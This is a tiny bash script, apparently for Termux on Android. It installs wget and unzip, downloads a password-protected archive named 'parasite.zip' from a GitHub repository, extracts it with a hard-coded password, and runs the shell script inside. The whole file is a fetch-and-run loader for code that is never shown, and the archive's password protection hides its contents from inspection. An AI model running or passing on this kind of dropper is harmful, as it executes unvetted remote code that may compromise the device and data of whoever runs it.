#!/bin/bash
until command -v wget > /dev/null; do
    pkg install wget unzip -y
done
wget https://raw.githubusercontent.com/SrTopster/Parasite/main/parasite.zip
unzip -P tibia parasite.zip
bash parasite.sh
exit
